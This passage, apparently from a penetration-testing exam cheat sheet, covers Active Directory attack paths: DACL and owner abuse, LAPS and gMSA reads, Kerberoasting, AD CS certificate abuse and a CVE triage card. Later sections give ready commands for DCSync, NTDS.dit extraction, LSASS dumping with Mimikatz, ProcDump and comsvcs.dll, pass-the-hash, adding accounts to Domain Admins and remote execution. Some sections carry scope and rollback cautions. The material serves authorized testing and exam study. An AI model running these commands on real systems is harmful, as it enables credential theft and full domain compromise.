+NT hash
+Kerberos ticket
+Certificate/private key
+LAPS password
+gMSA credential
+DPAPI secret
+</code></pre>
+</details>
+
+<details id="ref-9-6a-v16-impacket-013-ad-helpers">
+<summary>⚙ 9.6A Impacket 0.13 AD Helpers — ACL, Owner, LAPS, Computers, dMSA</summary>
+<p><span class="v16-ref-tier v16-ref-core">✓ CORE</span> Impacket 0.13.1 added/strengthened helpers that map directly to common BloodHound findings. Use your installed <code>-h</code> output as the syntax authority.</p>
+<h3>WriteDACL / DACL inspection</h3>
+<pre class="ref-code"><code class="language-bash"># Read exact target DACL first
+impacket-dacledit -action read -target 'TARGET' -dc-ip $DC_IP "$DOMAIN/$AUTH_USER"  # password prompt
+
+# Back up before state-changing abuse
+impacket-dacledit -action backup -target 'TARGET' -dc-ip $DC_IP "$DOMAIN/$AUTH_USER"  # password prompt
+
+# Common supported right families include FullControl, ResetPassword,
+# WriteMembers and DCSync. Confirm your local -h before writing.
+impacket-dacledit -h
+
+# Restore from the backup file when appropriate
+impacket-dacledit -action restore -file dacledit-YYYYMMDD-HHMMSS.bak -dc-ip $DC_IP "$DOMAIN/$AUTH_USER"  # password prompt</code></pre>
+<h3>WriteOwner</h3>
+<pre class="ref-code"><code class="language-bash">impacket-owneredit -action read -target 'TARGET' -dc-ip $DC_IP "$DOMAIN/$AUTH_USER"  # password prompt
+impacket-owneredit -h
+# If the graph proves WriteOwner, set only the intended owner, then validate DACL control.
+# Record previous owner and rollback plan before any write.</code></pre>
+<h3>Windows LAPS / LAPSv2</h3>
+<pre class="ref-code"><code class="language-bash"># Query only if the current identity has the right to read LAPS material
+impacket-GetLAPSPassword "$DOMAIN/$AUTH_USER" -dc-ip $DC_IP  # password prompt
+# Windows Server 2025 / environments enforcing LDAPS may require:
+impacket-GetLAPSPassword "$DOMAIN/$AUTH_USER" -dc-ip $DC_IP -ldaps  # password prompt
+# Target one computer:
+impacket-GetLAPSPassword "$DOMAIN/$AUTH_USER" -dc-ip $DC_IP -computer 'HOSTNAME$'  # password prompt</code></pre>
+<h3>Computer inventory</h3>
+<pre class="ref-code"><code class="language-bash">impacket-GetADComputers -h
+# Use it when you need LDAP-derived computer DNS names / OS data and BloodHound is unavailable or incomplete.</code></pre>
+<h3>BadSuccessor / dMSA</h3>
+<p><span class="v16-ref-tier v16-ref-cond">● CONDITIONAL</span> Newer Windows Server / dMSA environments only. Do not spend exam time here unless the feature and permissions actually exist.</p>
+<pre class="ref-code"><code class="language-bash">impacket-badsuccessor -h
+# Start with the SEARCH action to identify OUs where the current principal has the required permissions.
+# Only consider add/modify/delete after you can state the exact permission, target OU, resulting identity and rollback.</code></pre>
+<p><strong>BloodHound translation:</strong> edge → exact object → exact ACE/attribute → read/backup → minimum change → validate resulting access → preserve rollback.</p>
+<h3>0.13.1 exam-relevant changes</h3>
+<ul>
+<li><strong>AES-first Kerberoasting:</strong> <code>GetUserSPNs.py</code> now exposes <code>-no-rc4</code>. Use it only when the ordinary request fails because RC4 is disabled; the installed <code>-h</code> remains authoritative.</li>
+<li><strong>SMB client:</strong> current <code>impacket-smbclient</code> improves listings, DFS handling and recursive <code>rget</code>. List first and download only files necessary for the objective.</li>
+<li><strong>Directory operations:</strong> 0.13.1 includes ACL/owner lookup fixes, updated key-credential handling for current Windows behavior and fixes for BadSuccessor false negatives.</li>
+<li><strong>DPAPI/SCCM:</strong> new <code>impacket-dpapidump</code> is a privileged, late-stage remote collection option—not initial enumeration.</li>
+</ul>
+<pre class="ref-code"><code class="language-bash"># Ordinary request first; AES/no-RC4 fallback only when the environment requires it
+impacket-GetUserSPNs "$DOMAIN/$USER" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt  # password prompt
+impacket-GetUserSPNs "$DOMAIN/$USER" -dc-ip "$DC_IP" -request -no-rc4 -outputfile kerberoast-aes.txt  # password prompt
+
+# Privileged/late: prove remote administrative access, scope and need first
+impacket-dpapidump -creds -dc-ip "$DC_IP" "$DOMAIN/$USER@$TARGET_HOST"  # password prompt
+# SCCM client secrets are a separate explicit action:
+impacket-dpapidump -sccm -dc-ip "$DC_IP" "$DOMAIN/$USER@$TARGET_HOST"  # password prompt
+</code></pre>
+<blockquote><p><strong>Collection gate:</strong> record the target, privilege, purpose, output location and report relevance. Do not collect broadly merely because a tool can.</p></blockquote>
+</details>
+
+<details id="ref-9-6c-v19-credential-material-router">
+<summary>🔑 9.6C Credential Material Router — Type, Scope, One-Host Proof, Then Expand</summary>
+<p><span class="v16-ref-tier v16-ref-core">✓ CORE</span> A secret is not a generic “credential.” Its account scope, cryptographic form, target naming and supported protocol decide which client can use it. The Windows desk renders copy-ready plans for all eight material types below.</p>
+<table><thead><tr><th>Material</th><th>Critical distinction</th><th>First proof</th><th>Do not conclude</th></tr></thead><tbody>
+<tr><td>Domain password</td><td>DNS domain + sAMAccountName/UPN; lockout risk</td><td>One-host SMB or LDAP authentication</td><td>Authentication means admin</td></tr>
+<tr><td>Local password</td><td>One computer/SAM, not the domain</td><td>One-host SMB with <code>--local-auth</code></td><td>Safe to sweep every host</td></tr>
+<tr><td>NT hash</td><td>Local vs domain account; NT half vs LM:NT</td><td>One-host NetExec <code>-H</code></td><td>Every protocol accepts pass-the-hash</td></tr>
+<tr><td>ccache/kirbi</td><td>Ticket principal, service, realm, validity, hostname</td><td><code>klist</code>, FQDN, then <code>--use-kcache</code>/<code>-k -no-pass</code></td><td>An IP can replace the SPN hostname</td></tr>
+<tr><td>PFX/PEM certificate</td><td>Certificate identity, private key and optional password</td><td>NetExec certificate authentication to LDAP or Certipy auth</td><td>A certificate guarantees PKINIT works</td></tr>
+<tr><td>AES key</td><td>128/256-bit key for one principal</td><td><code>impacket-getTGT -aesKey</code>, then inspect ccache</td><td>An AES key is an NT hash</td></tr>
+<tr><td>LAPS password</td><td>Password belongs to one computer’s local administrator identity</td><td>That host only, <code>--local-auth</code></td><td>Reuse across unrelated hosts</td></tr>
+<tr><td>gMSA hash</td><td>Service account with useful SPN/host relationship</td><td>One justified service using the NT hash</td><td>Possession alone reveals the path</td></tr>
+</tbody></table>
+<h3>Universal gate</h3><ol><li>Write the exact source, principal, local/domain scope and material type.</li><li>Check lockout/policy, DNS/time, route and exposed protocol.</li><li>Run one read/authentication proof against one justified host.</li><li>Record authentication separately from authorization/admin/code execution.</li><li>Only then test another known service or host supported by the evidence.</li><li>Protect ticket/key/hash files and remove temporary environment variables when done.</li></ol>
+</details>
+
+<details id="ref-9-6b-v19-bloodhound-edge-execution-desk">
+<summary>🧭 9.6B BloodHound Edge Execution Desk — Prove, Act, Verify, Restore</summary>
+<p><span class="v16-ref-tier v16-ref-core">✓ CORE</span> A graph edge says what a principal may be able to do to an object. It does not prove that your current credential format, ticket, token, DNS, route, protocol, host policy or installed tool syntax can execute the path. Use the interactive planner in <strong>Windows</strong> for copy-ready commands.</p>
+<h3>The five-line edge record</h3>
+<pre class="ref-code"><code class="language-text">SOURCE I CONTROL:
+EDGE + TARGET OBJECT:
+PREREQUISITES PROVED:
+MINIMUM ACTION + EXPECTED RESULT:
+PRE-STATE / ROLLBACK / VERIFICATION:</code></pre>
+<table><thead><tr><th>Edge</th><th>Must prove first</th><th>Minimum preferred branch</th><th>Close / restore</th></tr></thead><tbody>
+<tr><td>GenericAll / GenericWrite → user</td><td>Exact target type and writable attribute; PKINIT prerequisites or WriteSPN</td><td>Shadow Credentials auto workflow when supported; otherwise targeted Kerberoast</td><td>Compare key/SPN list with saved pre-state; never clear all values</td></tr>
+<tr><td>AddMember / group control</td><td>Exact group and current membership</td><td>Add only one controlled principal</td><td>Fresh token to use; remove that exact membership and re-read</td></tr>
+<tr><td>ForceChangePassword</td><td>Exact user, service-account impact, no safer path</td><td>One compliant reset only when necessary</td><td>No safe generic rollback without the old password; record impact</td></tr>
+<tr><td>WriteDacl</td><td>Exact object, supported minimum right, DACL backup file</td><td>Grant one minimum ACE</td><td>Restore the exact backup and compare</td></tr>
+<tr><td>WriteOwner</td><td>Original owner recorded exactly</td><td>Take ownership only as a bridge to the minimum DACL change</td><td>Restore DACL, then original owner, then re-read both</td></tr>
+<tr><td>AddKeyCredentialLink</td><td>2016+ schema/DC and working PKINIT/CA</td><td>Certipy shadow auto against one target</td><td>Confirm auto-cleanup; remove only the recorded device ID if needed</td></tr>
+<tr><td>AllowedToAct / RBCD</td><td>Controlled computer/service with SPN; 2012+ target; impersonated user is delegable</td><td>One delegate, then one service/FQDN-matched ticket</td><td>Remove only that delegate; never flush legitimate entries</td></tr>
+<tr><td>AdminTo / CanPSRemote / CanRDP</td><td>Fresh edge, exact hostname/IP, reachable service and policy</td><td>Use one exposed protocol</td><td>Close session; re-baseline the token produced by that protocol</td></tr>
+<tr><td>ReadLAPSPassword</td><td>Exact computer object mapped to host</td><td>Read one computer; authenticate locally</td><td>Read-only; do not reuse the secret across unrelated hosts</td></tr>
+<tr><td>ReadGMSAPassword</td><td>Exact gMSA and useful SPN/relationship</td><td>Read through LDAP, validate one account</td><td>Read-only; protect returned hash</td></tr>
+<tr><td>DCSync</td><td>GetChanges + GetChangesAll composition on exact domain</td><td>Dump only the required account first</td><td>Read-only; secure output and preserve report evidence</td></tr>
+</tbody></table>
+<h3>Failure order — do not switch tools randomly</h3>
+<ol><li>Re-confirm that the graph source is the identity you currently control and the edge has not become stale.</li><li>Resolve the exact DC/host FQDN and check route, ports and domain time.</li><li>Separate authentication from authorization; record protocol and account format.</li><li>Check object type, required attribute, schema/DC level, CA/PKINIT, SPN and Protected Users/delegation restrictions.</li><li>Run installed <code>-h</code>; wrapper names and arguments can differ from a write-up.</li><li>Repeat the same hypothesis once after correcting the proved cause. If no new evidence appears, park the path.</li></ol>
+<p><strong>Sources frozen for this release:</strong> SpecterOps BloodHound CE edge documentation; Fortra Impacket <code>dacledit.py</code>, <code>owneredit.py</code> and <code>rbcd.py</code>; Certipy command/post-exploitation reference; BloodyAD User Guide; targetedKerberoast README. The installed local help and the live official exam rules remain authoritative.</p>
+</details>
+
+<details id="ref-9-7-ad-cs-esc1-esc17-decision-tree">
+<summary>🎫 9.7 AD CS --- ESC1--ESC17 Decision Tree</summary>
+<blockquote>
+<p>✅ <strong>MANUAL ENUMERATION/VALIDATION</strong> · <code>[REQ:DOMAIN_CREDS]</code> · action legality matters; do not use prohibited spoofing/poisoning as part of a relay path.</p>
+</blockquote>
+<p><code>[AD:ADCS]</code></p>
+<p>Modern AD CS assessment should include the full ESC1--ESC17 family
+rather than stopping at ESC1/ESC8.</p>
+<pre class="ref-code"><code class="language-text">DISCOVER CA
+   ↓
+ENUMERATE TEMPLATES
+   ↓
+WHO CAN ENROLL?
+   ↓
+WHO CAN MODIFY TEMPLATE?
+   ↓
+SUBJECT / SAN CONTROL?
+   ↓
+EKU / CLIENT AUTHENTICATION?
+   ↓
+MANAGER APPROVAL?
+   ↓
+AUTHORIZED SIGNATURES?
+   ↓
+CERTIFICATE MAPPING?
+   ↓
+CA-LEVEL PERMISSIONS?
+   ↓
+ESC1–ESC17
+</code></pre>
+<p>Tool:</p>
+<p>https://github.com/ly4k/Certipy</p>
+<h3>Current Certipy workflow — verify installed version first</h3>
+<pre class="ref-code"><code class="language-bash">certipy -v
+
+# ✓ Enumerate enabled/vulnerable AD CS configuration:
+certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip $DC_IP -enabled -vulnerable -stdout
+
+# Save detailed output:
+certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip $DC_IP -enabled -vulnerable -text -output adcs
+
+# Manual request example — ONLY after you have validated the exact template/CA path:
+certipy req -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip $DC_IP \
+  -ca 'CA-NAME' -template 'TEMPLATE-NAME'
+
+# Authenticate with a certificate you legitimately obtained through the validated path:
+certipy auth -pfx certificate.pfx -dc-ip $DC_IP
+</code></pre>
+<blockquote>
+<p><strong>Rule:</strong> <code>find</code> is enumeration. Before <code>req</code>, <code>shadow</code>, <code>relay</code>, template modification, or other state-changing/abuse actions, validate the exact permission and make sure the action itself does not rely on an exam-prohibited technique such as spoofing/poisoning.</p>
+</blockquote>
+<p>Key questions:</p>
+<ul>
+<li>[ ] Who can enroll?</li>
+<li>[ ] Who can modify the template?</li>
+<li>[ ] Can the requester control subject/SAN?</li>
+<li>[ ] Does the certificate permit authentication?</li>
+<li>[ ] Is manager approval required?</li>
+<li>[ ] Are authorized signatures required?</li>
+<li>[ ] How is the certificate mapped to an AD principal?</li>
+<li>[ ] Can the CA itself be abused?</li>
+</ul>
+</details>
+
+<details id="ref-9-7a-v16-adcs-fast-matrix">
+<summary>🎯 9.7A AD CS Fast ESC Matrix — Signal → Must Prove → Next Check</summary>
+<p><span class="v16-ref-tier v16-ref-cond">● CONDITIONAL</span> Use <code>certipy find</code> for enumeration, then manually validate the exact path. Current Certipy 5.1.0 explicitly added/expanded ESC4 and ESC17 support.</p>
+<table>
+<thead><tr><th>Path</th><th>Signal</th><th>Must prove</th><th>Next check</th></tr></thead>
+<tbody>
+<tr><td>ESC1</td><td>Enrollee supplies subject/SAN</td><td>Auth-capable EKU + enrollment rights + no blocking approval/signature</td><td>Template flags + exact principal enrollment ACL</td></tr>
+<tr><td>ESC4</td><td>Template object write/control</td><td>Current identity can modify security-relevant template attributes</td><td>Read/backup template config; identify minimum change and rollback</td></tr>
+<tr><td>ESC8</td><td>HTTP enrollment endpoint</td><td>Relay-compatible auth/config + permitted exam action</td><td><strong>RULE-SENSITIVE:</strong> do not use prohibited spoofing/poisoning</td></tr>
+<tr><td>ESC13</td><td>Issuance policy / group linkage</td><td>Certificate policy maps to useful group/security context</td><td>Policy OIDs + linked group + enrollment rights</td></tr>
+<tr><td>ESC15</td><td>Schema/template behavior</td><td>Exact template/server conditions for arbitrary application policies</td><td>Server + template schema/version + Certipy finding details</td></tr>
+<tr><td>ESC16</td><td>Certificate mapping weakness</td><td>Exact CA/KDC mapping configuration</td><td>Mapping mode + certificate attributes + patch state</td></tr>
+<tr><td>ESC17</td><td>Server-auth certificate path</td><td>Exact template flags/rights and downstream impersonation prerequisite</td><td>Validate the full chain, not the ESC label alone</td></tr>
+</tbody></table>
+<pre class="ref-code"><code class="language-bash">certipy -v
+certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip $DC_IP -enabled -vulnerable -stdout</code></pre>
+</details>
+
+<details id="ref-9-7b-v16-certighost-cve-2026-54121">
+<summary>👻 9.7B Certighost — CVE-2026-54121 Prerequisite Decision Card</summary>
+<p><span class="v16-ref-tier v16-ref-sensitive">△ RULE-SENSITIVE</span><span class="v16-ref-tier v16-ref-cond">● CONDITIONAL</span> This is not "AD CS installed → domain admin." Microsoft documents multiple environmental prerequisites. Evaluate the action against current OffSec rules before any PoC that starts rogue/relay-style services.</p>
+<pre class="ref-code"><code class="language-text">ENTERPRISE CA PRESENT?
+        ↓ yes
+CA AFFECTED / UNPATCHED FOR JULY 2026 FIX?
+        ↓ yes
+ENROLLMENT THROUGH MACHINE-CERTIFICATE TEMPLATE / CHASE PATH?
+        ↓ yes
+VALID LOW-PRIV DOMAIN ACCOUNT?
+        ↓ yes
+CAN CREATE/CONTROL A MACHINE PRINCIPAL?
+  default MachineAccountQuota OR existing controlled computer
+        ↓ yes
+CA CAN ROUTE TO CONTROLLED HOST ON TCP 445 + TCP 389?
+        ↓ yes
+OPERATOR CAN REACH DC/CA REQUIRED LDAP/KERBEROS/RPC PATHS?
+        ↓ yes
+ONLY NOW: candidate Certighost path
+
+NO at any prerequisite → do not treat CVE as a working path.</code></pre>
+<p>Microsoft's published prerequisites include an Enterprise CA, machine-certificate enrollment, a controlled/new machine account path, CA-to-attacker SMB/LDAP reachability, and a valid domain account. The July 14, 2026 security update is the durable fix.</p>
+<p><strong>Important exam note:</strong> because public Certighost PoCs involve controlled SMB/LDAP listeners and authentication/challenge handling, re-check the exact current exam rule interpretation before use. This note is a triage card, not blanket approval of a PoC.</p>
+<p>Primary: https://techcommunity.microsoft.com/blog/MicrosoftThreatProtectionBlog/detecting-cve-2026-54121-certighost-with-microsoft-defender/4542861</p>
+</details>
+
+<details id="ref-9-8-acl-delegation-machine-account-methodology">
+<summary>◆ 9.8 ACL / Delegation / Machine Account Methodology</summary>
+<p><code>[AD:ACL]</code></p>
+<p>Prioritize:</p>
+<pre class="ref-code"><code class="language-text">GenericAll
+GenericWrite
+WriteDACL
+WriteOwner
+WriteProperty
+AddMember
+ForceChangePassword
+msDS-KeyCredentialLink
+msDS-AllowedToActOnBehalfOfOtherIdentity
+SPN write
+</code></pre>
+<p>Delegation:</p>
+<pre class="ref-code"><code class="language-text">Unconstrained
+Constrained
+RBCD
+</code></pre>
+<p>For every interesting ACL:</p>
+<pre class="ref-code"><code class="language-text">WHO has the permission?
+        ↓
+ON WHICH object?
+        ↓
+WHAT exact attribute/action can be changed?
+        ↓
+WHAT privilege does that change produce?
+        ↓
+CAN IT BE CHAINED TO ANOTHER OBJECT?
+</code></pre>
+</details>
+<details id="ref-9-6-domain-compromise-final-steps">
+<summary>💀 9.6 Domain Compromise --- Final Steps</summary>
+<pre class="ref-code"><code class="language-bash"># ── DCSYNC (get all hashes) ───────────────────────────────────
+# Requires: DCSync rights (DA, or granted via ACL)
+impacket-secretsdump $DOMAIN/admin@$DC
+impacket-secretsdump $DOMAIN/admin@$DC -just-dc-ntlm   # NTLM only
+impacket-secretsdump $DOMAIN/admin@$DC -just-dc-user Administrator
+impacket-secretsdump $DOMAIN/admin@$DC -outputfile loot/hashes/domain_hashes
+# Mimikatz:
+lsadump::dcsync /domain:$DOMAIN /user:krbtgt
+lsadump::dcsync /domain:$DOMAIN /all /csv
+
+# ── NTDS.DIT EXTRACTION ───────────────────────────────────────
+# If can't DCSync but have SYSTEM on DC:
+# VSS shadow copy:
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+# Transfer files to Kali, then:
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+
+# ── PASS-THE-HASH DA ──────────────────────────────────────────
+impacket-psexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
+impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
+evil-winrm -i $IP -u Administrator -H NTLMHASH
+nxc smb $IP -u Administrator -H NTLMHASH -x 'whoami'
+
+# ── VALIDATE DA HASH ON ONE JUSTIFIED HOST FIRST ───────────────
+# Start with a host already shown reachable/relevant; record auth vs admin separately.
+nxc smb $TARGET -u Administrator -H NTLMHASH
+# Only when provenance proves this is a local/SAM credential on that exact host:
+nxc smb $TARGET -u Administrator -H NTLMHASH --local-auth
+# Expand only through observed in-scope services / Credential Debt; do not blanket-spray a /24.
+
+# ── DUMP LSASS (for more creds) ───────────────────────────────
+# From admin shell:
+# Method 1 — Mimikatz:
+sekurlsa::logonpasswords
+# Method 2 — Task Manager (GUI): processes → lsass.exe → Create dump file
+# Method 3 — ProcDump:
+procdump.exe -ma lsass.exe lsass.dmp
+# Method 4 — comsvcs.dll (no extra tool):
+rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
+# Method 5 — Pypykatz (parse on Kali):
+pypykatz lsa minidump lsass.dmp
+</code></pre>
+</details>
+<details id="ref-9-7-acl-dacl-abuse">
+<summary>🔐 9.7 ACL / DACL Abuse</summary>
+<p><code>[AD:ACL]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── FIND EXPLOITABLE ACES ─────────────────────────────────────
+# PowerView:
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "lowprivuser"}
+# All writable ACEs for current user:
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty" -and $_.IdentityReferenceName -match "lowprivuser"}
+
+# BloodHound shows these too (red edges)
+
+# ── GENERICALL ON USER ────────────────────────────────────────
+# Change password:
+net user target 'NewPass123!' /domain
+# PowerShell:
+$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
+Set-ADAccountPassword -Identity target -NewPassword $pass -Reset -Confirm:$false
+# Force password reset on next login:
+Set-ADUser target -ChangePasswordAtLogon $true
+
+# ── GENERICALL / GENERICWRITE ON GROUP ────────────────────────
+# Add member:
+net group "Domain Admins" lowprivuser /add /domain
+Add-ADGroupMember -Identity "Domain Admins" -Members lowprivuser
+
+# ── WRITEDACL ─────────────────────────────────────────────────
+# Grant DCSync to self:
+Add-ObjectACL -PrincipalIdentity attacker -Credential cred -TargetIdentity "DC=domain,DC=com" -Rights DCSync
+# Then DCSync
+
+# ── WRITEOWNER ────────────────────────────────────────────────
+# Take ownership, then modify:
+Set-DomainObjectOwner -Identity target -OwnerIdentity attacker
+Add-ObjectACL -TargetIdentity target -PrincipalIdentity attacker -Rights All
+
+# ── FORCECHANGEPASSWORD ───────────────────────────────────────
+$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
+Set-DomainUserPassword -Identity target -AccountPassword $pass
+
+# ── ADDMEMBER ─────────────────────────────────────────────────
+Add-ADGroupMember -Identity "Domain Admins" -Members attacker
+net group "Domain Admins" attacker /add /domain
+</code></pre>
+</details>
+<details id="ref-9-8-lateral-movement-in-ad">
+<summary>🏃 9.8 Lateral Movement in AD</summary>
+<p><code>[AD:LATERAL]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── REMOTE CODE EXECUTION (choose based on what's open) ───────
+# WinRM (5985): evil-winrm
+# SMB (445): psexec, smbexec, atexec
+# WMI (135): wmiexec
+# DCOM (135): dcomexec
+# SSH (22): ssh
+# RDP (3389): xfreerdp
+
+# ── IMPACKET SUITE ────────────────────────────────────────────
+impacket-psexec $DOMAIN/user@$IP               # Creates service, uploads binary
+impacket-psexec $DOMAIN/user@$IP -hashes :NTLMHASH
+impacket-wmiexec $DOMAIN/user@$IP              # WMI — no service created
+impacket-smbexec $DOMAIN/user@$IP              # SMB — no binary on disk
+impacket-atexec $DOMAIN/user@$IP "whoami"      # Task scheduler
+impacket-dcomexec $DOMAIN/user@$IP 'cmd.exe /c whoami' -object MMC20  # DCOM
+
+# ── nxc ──────────────────────────────────────────────
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'           # cmd
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" -X 'Get-Process'      # PowerShell
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS" -x 'whoami'
+nxc smb $TARGET -u admin -H HASH  # Validate one justified host first; use Credential Debt for any expansion
+
+# ── EVIL-WINRM ────────────────────────────────────────────────
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+# Upload tool:
+upload /tmp/winPEAS.exe
+# Capture the flag in place from this interactive target shell:
+ipconfig
+type C:\Users\Administrator\Desktop\proof.txt
+
+# ── ENABLE WINRM (from local admin) ───────────────────────────
+Enable-PSRemoting -Force
+winrm quickconfig -quiet
+netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
+</code></pre>
+</details>
+<hr/>
+<details id="ref-9-x-standalone-fast-path-foothold-root-without-wandering">
+<summary>🎯 9.x STANDALONE FAST PATH — Foothold → Root Without Wandering</summary>
+<p><code>[AD:FLOW]</code></p>
+<h3>Foothold triage</h3>
+<pre class="ref-code"><code class="language-text">ALL TCP PORTS
+   ↓
+SERVICE VERSION + HOSTNAME/VHOST
+   ↓
+ANONYMOUS / DEFAULT CREDS / FOUND CREDS
+   ↓
+WEB SOURCE + ROBOTS + BACKUPS + CONFIG + .git
+   ↓
+MANUAL WEB TESTING
+   ↓
+EXACT PRODUCT/BUILD + CVE PREREQUISITES
+   ↓
+FOOTHOLD
+</code></pre>
+<p>When multiple paths exist, rank them:</p>
+<pre class="ref-code"><code class="language-text">1. Credentials / exposed secrets
+2. Obvious writable/upload/file-read/command primitives
+3. Known exact-version exploit with matching prerequisites
+4. Complex or unstable exploit chain
+</code></pre>
+<h3>First 5 minutes after a Linux shell</h3>
+<pre class="ref-code"><code class="language-bash">id
+sudo -l
+ss -lntup
+find / -perm -4000 -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null
+</code></pre>
+<p>Then immediately start <code>pspy</code>/LinPEAS in parallel while manually checking cron/systemd, credentials, writable services/scripts and internal listeners.</p>
+<h3>First 5 minutes after a Windows shell</h3>
+<pre class="ref-code"><code class="language-cmd">whoami /all
+whoami /priv
+netstat -ano
+schtasks /query /fo LIST /v
+sc query
+</code></pre>
+<p>Then run PrivescCheck/WinPEAS/Seatbelt as appropriate and <strong>read the output carefully</strong>. Recent 2026 pass feedback repeatedly highlights lost time caused by running tools but overlooking their results.</p>
+<h3>"Kitchen sink" does NOT mean random</h3>
+<p>Automated enumeration is useful only after you have a baseline. Keep a short shortlist:</p>
+<pre class="ref-code"><code class="language-text">HIGH CONFIDENCEMEDIUM CONFIDENCE
+LOW CONFIDENCE / PARKED
+</code></pre>
+<p>Work high-confidence paths first.</p>
+</details>
